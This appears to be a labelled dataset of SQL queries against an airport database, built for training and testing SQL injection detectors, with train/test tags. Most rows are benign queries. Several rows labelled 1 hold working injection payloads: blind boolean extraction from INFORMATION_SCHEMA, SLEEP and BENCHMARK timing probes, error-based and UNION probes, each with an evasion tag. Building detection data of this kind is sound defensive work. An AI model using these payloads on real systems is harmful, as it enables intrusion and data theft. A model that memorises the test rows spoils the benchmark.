"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CO""",0,CO,,,,select,airport-S9,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Sioux Falls;""",0,Sioux Falls,,,,select,airport-S21,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""NO-20"", ""Phattalung Province"", ""EU"", ""GN"", ""https://en.wikipedia.org/wiki/Sakon_Nakhon_province"", ""Airports in (unassigned)"")",0,NO-20 Phattalung Province EU GN https://en.wikipedia.org/wiki/Sakon_Nakhon_province Airports in (unassigned),,,,insert,airport-I4,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""SOQ, WASS, Sorong"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""43CN"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""KZ6"", ""%"");",0,"SOQ, WASS, Sorong 43CN KZ6",,,,select,airport-S17,,,test
"UPDATE airport_frequencies SET description = ""SEATTLE CNTR"" WHERE airport_ident = ""LTAG"";",0,SEATTLE CNTR LTAG,,,,update,airport-U5,,,test
"SELECT * FROM airport WHERE gps_code = ""VT50"" OR local_code = ""FRG""",0,VT50 FRG,,,,select,airport-S4,,,train
SELECT * FROM airport WHERE icao_code = 'MMZO';,0,MMZO,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 35.0 AND 2568.0",0,35.0 2568.0,,,,select,airport-S2,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""MO"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,MO 4,,,,select,airport-S19,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 125.7 AND  122.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  120.475  AND  122.9  ORDER BY frequency;",0,125.7 122.1 120.475 122.9,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE continent = ""AS"" AND iso_region LIKE ""JP-21""",0,AS JP-21,,,,select,airport-S8,,,test
"UPDATE airport_frequencies SET frequency_mhz = 121.1 WHERE type = ""GND"";",0,121.1 GND,,,,update,airport-U6,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""JP"", ""Mauritius"", ""AF"", ""Aeropuertos de Colombia"")",0,JP Mauritius AF Aeropuertos de Colombia,,,,insert,airport-I6,,,test
SHOW COLUMNS FROM db,0,,,,,admin,airport-admin3,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (25351, ""MDAN"", 2760.0, ""ASP"", 0, 1)",0,25351 MDAN 2760.0 ASP 0 1,,,,insert,airport-I9,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""JJ5"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Sinoe County"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Uruguay"", ""%"");",0,JJ5 Airports in Sinoe County Aeropuertos de Uruguay,,,,select,airport-S18,,,test
SELECT * FROM airport WHERE icao_code = 'FALD';,0,FALD,,,,select,airport-S1,,,test
"DELETE FROM regions WHERE name = ""Indiana"";",0,Indiana,,,,delete,airport-D8,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 118.65 AND  122.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  119.4  AND  118.5  ORDER BY frequency;",0,118.65 122.3 119.4 118.5,,,,select,airport-S13,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Hughes Ultralightport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Hughes Ultralightport,,,,select,airport-S14,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (89605, ""PNM"", ""Tianjin"", ""-4833"") as nfQM where 6728=6728 or 9725=9725#"", 129, ""DE"")",1," 89605 PNM"" Tianjin"" -4833  as nfQM where 6728=6728 or 9725=9725# 129 DE ",recon,lowercase,failure,insert,airport-I10,boolean-54,boolean,test
"INSERT INTO countries (code, name, continent) VALUES (""IR"", ""Afghanistan"", ""AS"")",0,IR Afghanistan AS,,,,insert,airport-I7,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Colchester;""",0,Colchester,,,,select,airport-S21,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""CA""",0,CA,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE gps_code = ""15TX"" OR local_code = ""65MS""",0,15TX 65MS,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE name = ""Shilo Heliport"" AND 4671=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 9,1),11,1))>121) THEN 4671 ELSE (SELECT 5040 UNION SELECT 2849) END))-- -"";  ",1," Shilo Heliport"" AND 4671=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x6e617661696473 AND table_schema=0x64617461736574 LIMIT 9,1),11,1))>121) THEN 4671 ELSE (SELECT 5040 UNION SELECT 2849) END))-- - ",exploit,sleep2getlock,success,delete,airport-D2,boolean-120,boolean,test
"UPDATE airport SET home_link = ""http://aeroprakt.org"" WHERE name = ""Aeródromo de Griñón""",0,http://aeroprakt.org Aeródromo de Griñón,,,,update,airport-U4,,,test
"UPDATE airport SET municipality = ""Sosnová"" WHERE iso_country = ""CA""",0,Sosnová CA,,,,update,airport-U2,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""FA18"", ""heliport"", ""Slavgorod North Air Base"", -28.052062, 30.186111)",0,FA18 heliport Slavgorod North Air Base -28.052062 30.186111,,,,insert,airport-I1,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""KR-0520"";",0,KR-0520,,,,select,airport-S7,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""1921';(SELECT * FROM (SELECT/**/(SLEEP/**/(5)))UJcx) OR 'Zknx'='Gyje"" AS SIGNED) AND a.iso_country = ""GQ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",1, 1921';(SELECT * FROM (SELECT/**/(SLEEP/**/(5)))UJcx) OR 'Zknx'='Gyje GQ ,recon,commentbeforeparentheses,failure,select,airport-S22,stacked-267,stacked,test
"UPDATE navaids SET name = ""Metlika"" WHERE ident = ""IOF"";",0,Metlika IOF,,,,update,airport-U7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AG"" GROUP BY r.name ORDER BY r.name ASC;",0,AG,,,,select,airport-S5,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('FASG','A43','YCRD','SDHI');",0,FASG A43 YCRD SDHI,,,,update,airport-U10,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (91518, ""CH"", ""Dnipropetrovsk"", ""NDB""WHERE5459=5459	OR
1370=BENCHMARK(5000000,MD5(0x6d776865))#"", 113300, ""LV"")",1," 91518 CH"" Dnipropetrovsk"" NDB""WHERE5459=5459	OR
1370=BENCHMARK(5000000,MD5(0x6d776865))# 113300 LV ",recon,space2mysqlblank,success,insert,airport-I10,time-58,time,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Chajul Airport""",0,Chajul Airport,,,,select,airport-S3,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""IN""",0,IN,,,,select,airport-S9,,,test
"SELECT * FROM airport WHERE gps_code = ""SDYM"" OR local_code = ""VT17""",0,SDYM VT17,,,,select,airport-S4,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""ВПП Осечки"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SIQX"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Wuesthoff Hospital Emergency Heliport"", ""%"");",0,ВПП Осечки SIQX Wuesthoff Hospital Emergency Heliport,,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Smuravyevo Air Base, Аэродром Смуравьёво, Аэродром Смуравьево"") OR name LIKE ""Prime Center""",0,"Smuravyevo Air Base, Аэродром Смуравьёво, Аэродром Смуравьево Prime Center",,,,select,airport-S10,,,test
"DELETE FROM airport WHERE name LIKE ""JC Helipad"" OR keywords LIKE ""NA89"";  ",0,JC Helipad NA89,,,,delete,airport-D3,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Haeundae Centrum Hotel"") OR name LIKE ""Base ULM de Kogenheim, Club ULM de Kogenheim""",0,"Haeundae Centrum Hotel Base ULM de Kogenheim, Club ULM de Kogenheim",,,,select,airport-S10,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Alibori Department"";",0,Alibori Department,,,,select,airport-S15,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AR"") OR a.elevation_ft > 1250.0",0,AR 1250.0,,,,select,airport-S11,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Chatcolet Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Chatcolet Airport,,,,select,airport-S14,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('US-12116','VYKG','GB-1038','YCTA');",0,US-12116 VYKG GB-1038 YCTA,,,,update,airport-U10,,,test
"UPDATE airport SET name = ""PAF Cannery Airport"" WHERE ident = ""PH-0558""",0,PAF Cannery Airport PH-0558,,,,update,airport-U1,,,test
"UPDATE countries SET keywords = ""Aéroports de France"" WHERE code = ""TH"";",0,Aéroports de France TH,,,,update,airport-U8,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('SIDV','SIDV','SIDV','SIDV');",1, SIDV SIDV SIDV SIDV ,recon,lowercase,success,update,airport-U10,stacked-111,stacked,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 12,1),2,1))>110,3990) AND ""SD"" LIKE ""SD"", ""Tanzania"", ""EU"", ""Airports in Sint Maarten"")",1," SD"" LIKE ""SD"" AND ELT(ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x616972706f7274 AND table_schema LIKE 0x64617461736574 LIMIT 12,1),2,1))>110,3990) AND ""SD"" LIKE ""SD Tanzania EU Airports in Sint Maarten ",exploit,equaltolike,success,insert,airport-I6,boolean-30,boolean,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""CV"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,CV 2,,,,select,airport-S19,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('IT-0312','SWBM','UIAM','GB-0289');",0,IT-0312 SWBM UIAM GB-0289,,,,update,airport-U10,,,test
"DELETE FROM regions WHERE name = ""Norte de Santander Department') where 1722=1722 and exp(~(select * from (select concat(0x717a6a7871,(select (ELT(2251=2251,1))),0x7171626271,0x78))x))-- KPxC"";",1," Norte de Santander Department') where 1722=1722 and exp(~(select * from (select concat(0x717a6a7871,(select (ELT(2251=2251,1))),0x7171626271,0x78))x))-- KPxC ",recon,lowercase,success,delete,airport-D8,error-151,error,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (7824, ""16NE"", 1585.0, ""TURF"", 0, 0)",0,7824 16NE 1585.0 TURF 0 0,,,,insert,airport-I9,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""GI"", ""Gabon"", ""OC"", ""Manx"")",0,GI Gabon OC Manx,,,,insert,airport-I6,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2868"" AS SIGNED) AND a.iso_country = ""PR"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2868 PR,,,,select,airport-S22,,,test
"SELECT * FROM airport WHERE gps_code = ""SSZW"" OR local_code = ""SP0048""",0,SSZW SP0048,,,,select,airport-S4,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""AR"") OR a.elevation_ft > 222.0",0,AR 222.0,,,,select,airport-S11,,,test
"UPDATE airport SET name = ""Klagenfurt Clinic Heliport"" WHERE ident = ""YGHT""",0,Klagenfurt Clinic Heliport YGHT,,,,update,airport-U1,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Jonesville Airport"");",0,Jonesville Airport,,,,select,airport-S12,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Jindal Heliport"" and 8252=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 7,1),5,1))>108) then 8252 else (select 4915 union select 9561) end))-- -""",1," Jindal Heliport  and 8252=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x726567696f6e73 and table_schema=0x64617461736574 limit 7,1),5,1))>108) then 8252 else (select 4915 union select 9561) end))-- - ",exploit,lowercase,success,select,airport-S3,boolean-168,boolean,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Tin Zaoutine Airport"");",0,Tin Zaoutine Airport,,,,select,airport-S12,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Tampico;""",0,Tampico,,,,select,airport-S21,,,train
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6306"" AS SIGNED) AND a.iso_country = ""TL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6306 TL,,,,select,airport-S22,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Aeropuerto Nacional de Playa del Carmen"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Nakhchivan Autonomous Republic"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in Malawi"", ""%"");",0,Aeropuerto Nacional de Playa del Carmen Airports in Nakhchivan Autonomous Republic Airports in Malawi,,,,select,airport-S18,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Damascus Governorate"";",0,Damascus Governorate,,,,select,airport-S15,,,test
"SELECT * FROM airport WHERE gps_code = ""KT41"" OR local_code = ""SC0195""",0,KT41 SC0195,,,,select,airport-S4,,,test
"SELECT id FROM airports WHERE latitude >= 41.101299 AND scheduled_service = ""no"" AND elevation_feet >= 962.0",0,41.101299 no 962.0,,,,select,airport-S23,,,test
"UPDATE airport SET home_link = ""https://www.penndot.gov/TravelInPA/airports-pa/Pages/McVille-Airport.aspx"" WHERE name = ""Grace Lake Seaplane Base""",0,https://www.penndot.gov/TravelInPA/airports-pa/Pages/McVille-Airport.aspx Grace Lake Seaplane Base,,,,update,airport-U4,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (92940, ""GD"", ""Deadhorse"", ""NDB"", 113800, ""AR"")",0,92940 GD Deadhorse NDB 113800 AR,,,,insert,airport-I10,,,train
"UPDATE airport SET municipality = ""Yokohama"" wheRE 4201=4201 aND 4586=(seLEcT (Case WHen (OrD(miD((seLEcT ifnULL(Cast(coluMn_nAmE aS NChAr),0x20) FroM INFORMATION_SCHEMA.COLumNs wheRE TaBlE_naMe=0x636f756e7472696573 aND table_schema=0x64617461736574 lIMit 5,1),1,1))>107) tHEn 4586 ElSe (seLEcT 5693 UnIoN seLEcT 1273) End))-- -"" WHERE iso_country = ""US""",1," Yokohama  wheRE 4201=4201 aND 4586=(seLEcT (Case WHen (OrD(miD((seLEcT ifnULL(Cast(coluMn_nAmE aS NChAr),0x20) FroM INFORMATION_SCHEMA.COLumNs wheRE TaBlE_naMe=0x636f756e7472696573 aND table_schema=0x64617461736574 lIMit 5,1),1,1))>107) tHEn 4586 ElSe (seLEcT 5693 UnIoN seLEcT 1273) End))-- - US ",exploit,randomcase,success,update,airport-U2,boolean-66,boolean,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""28IN"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SWNF"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Clifton, Clifton Moor, RAF Rawcliffe, RAF York, York Municipal Aerodrome"", ""%"");",0,"28IN SWNF Clifton, Clifton Moor, RAF Rawcliffe, RAF York, York Municipal Aerodrome",,,,select,airport-S17,,,test
"DELETE FROM navaids WHERE ident = ""GY"";",0,GY,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""DE"") OR a.elevation_ft > 26.0",0,DE 26.0,,,,select,airport-S11,,,test
"INSERT INTO countries (code, name, continent) VALUES (""HU"", ""Estonia"", ""AF"")",0,HU Estonia AF,,,,insert,airport-I7,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Lagunillas  Heliport""",0,Lagunillas  Heliport,,,,select,airport-S3,,,test
"DELETE FROM airport WHERE name LIKE ""Degerfors Grenlanda Airfield"" OR keywords LIKE ""Flugplatz Gera-Leumnitz"";  ",0,Degerfors Grenlanda Airfield Flugplatz Gera-Leumnitz,,,,delete,airport-D3,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""UA-0181"";",0,UA-0181,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Dnipropetrovsk, Міжнародний аеропорт «Дніпро»"") OR name LIKE ""Oxbow Geothermal""",0,"Dnipropetrovsk, Міжнародний аеропорт «Дніпро» Oxbow Geothermal",,,,select,airport-S10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""UY"" OR c.name LIKE CONCAT(""%"", ""Mexico"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,UY Mexico 3,,,,select,airport-S20,,,train
"DELETE FROM regions WHERE name = ""South Kurdufan State"";",0,South Kurdufan State,,,,delete,airport-D8,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 600.0 AND 600.0",1, 600.0 600.0,recon,space2mysqlblank,failure,select,airport-S2,union-164,union,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3468"" AS SIGNED) AND a.iso_country = ""LI"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3468 LI,,,,select,airport-S22,,,train
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Boyd"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Susa District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Lentokentät, Suomen"", ""%"");",0,"Boyd Airports in Susa District Lentokentät, Suomen",,,,select,airport-S18,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Happy Landings"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""6NJ9, 6NJ9"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Egorlykskaya Airfield, Аэродром Егорлыкская, XRRL"", ""%"");",0,"Happy Landings 6NJ9, 6NJ9 Egorlykskaya Airfield, Аэродром Егорлыкская, XRRL",,,,select,airport-S17,,,test
"UPDATE navaids SET name = ""Mbandaka"" WHERE ident = ""HID"";",0,Mbandaka HID,,,,update,airport-U7,,,test
"UPDATE airport_frequencies SET frequency_mhz = 127.35 WHERE type = ""RADIO"";",0,127.35 RADIO,,,,update,airport-U6,,,test
"DELETE FROM countries WHERE code = ""GS"";",0,GS,,,,delete,airport-D7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Caernarfon Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Caernarfon Airport,,,,select,airport-S14,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""HU"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,HU 5,,,,select,airport-S19,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 117.0 AND 1302.0",0,117.0 1302.0,,,,select,airport-S2,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""GW-CA"", ""Saint Lucy"", ""AS"", ""TR"", ""-3218')/**/UNION/**/ALL/**/SELECT/**/6268,6268,6268,6268,6268,6268,6268--/**/-"", ""Airports in Mtskheta-Mtianeti"")",1," GW-CA Saint Lucy AS TR -3218')/**/UNION/**/ALL/**/SELECT/**/6268,6268,6268,6268,6268,6268,6268--/**/- Airports in Mtskheta-Mtianeti ",recon,space2comment,failure,insert,airport-I4,union-20,union,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""BN"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,BN 2,,,,select,airport-S19,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('AU-0738','US-4345','US-8684','EIBT');",0,AU-0738 US-4345 US-8684 EIBT,,,,update,airport-U10,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""PY"" OR c.name LIKE CONCAT(""%"", ""Serbia"" HAVING 1041=1041-- XpaF"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",1," PY Serbia"" HAVING 1041=1041-- XpaF 2 ",recon,commentbeforeparentheses,success,select,airport-S20,boolean-252,boolean,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""NO"" OR c.name LIKE CONCAT(""%"", ""Mongolia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,NO Mongolia 4,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""WS33"", ""heliport"", ""Helibase Pelikan 1"", -6.068889141082764, -95.894096)",0,WS33 heliport Helibase Pelikan 1 -6.068889141082764 -95.894096,,,,insert,airport-I1,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Sand Springs Strip""",0,Sand Springs Strip,,,,select,airport-S3,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hospital Geral de Palmares Heliport""",0,Hospital Geral de Palmares Heliport,,,,select,airport-S3,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""ST7"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Biskra Province"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""South Sudanese airports"", ""%"");",0,ST7 Airports in Biskra Province South Sudanese airports,,,,select,airport-S18,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""CFD International"") OR name LIKE ""5MS4""",0,CFD International 5MS4,,,,select,airport-S10,,,train
"DELETE FROM countries WHERE code = ""NZ"";",0,NZ,,,,delete,airport-D7,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Bauang Power Plant Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Bauang Power Plant Heliport,,,,select,airport-S14,,,test
DROP USER 'ec2-user'@'localhost';,0,,,,,admin,airport-admin14,,,test
